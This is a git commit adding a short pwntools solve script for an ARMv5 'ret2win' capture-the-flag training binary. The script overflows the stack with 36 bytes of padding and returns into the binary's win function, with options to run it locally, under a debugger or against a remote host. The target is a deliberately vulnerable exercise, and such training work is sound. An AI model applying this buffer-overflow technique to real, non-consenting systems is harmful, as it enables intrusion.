acc6f7a12e19f64c13ecfc052b20a4930a0286a8
smashdashhashbrown <jaeminashley@yahoo.com>
2022-10-28 09:25:44 -0700

    arm ret2win solve

---
+++ armv5/ret2win/solve.py
@@ -0,0 +1,38 @@
+from pwn import *
+
+"""
+Run locally with:
+./exploit.py LOCAL
+Run against remote with:
+./exploit.py HOST=x.x.x.x PORT=xxxxx
+"""
+
+splash()
+elf = context.binary = ELF("./ret2win_armv5")
+
+
+def conn():
+    if args.LOCAL:
+        pty = process.PTY
+        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
+    elif args.GDB:
+        return gdb.debug(elf.path)
+    else:
+        return remote(args.HOST, args.PORT)
+
+def solve():
+    io = conn()
+
+    padding = cyclic(36)
+
+    payload = [
+        padding,
+        elf.sym.ret2win,
+    ]
+
+    io.sendline(flat(payload))
+    io.interactive()
+
+
+if __name__ == "__main__":
+    solve()
